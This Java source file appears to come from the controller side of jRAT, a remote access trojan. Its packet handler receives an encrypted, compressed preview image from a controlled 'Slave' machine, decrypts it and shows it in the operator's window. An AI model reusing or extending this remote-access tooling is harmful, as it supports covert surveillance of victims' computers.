package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.FramePreviewImage;
import io.jrat.client.utils.ImageUtils;
import io.jrat.common.compress.GZip;
import io.jrat.common.crypto.Crypto;

import java.awt.Graphics;
import java.awt.image.BufferedImage;
import java.io.DataInputStream;


public class Packet43PreviewImage extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FramePreviewImage frame = FramePreviewImage.instances.get(slave);
		if (frame != null) {
			int imageSize = slave.readInt();
			int w = slave.readInt();
			int h = slave.readInt();

			BufferedImage image = new BufferedImage(w, h, BufferedImage.TYPE_INT_RGB);

			Graphics imageGraphics = image.getGraphics();

			byte[] buffer = new byte[imageSize];

			slave.getDataInputStream().readFully(buffer);

			buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getConnection().getKey());

			BufferedImage img = ImageUtils.decodeImage(buffer);
			imageGraphics.drawImage(img, 0, 0, w, h, null);

			frame.getPanel().image = image;
			frame.getPanel().repaint();

			frame.setButtonEnabled(true);
		}
	}

}
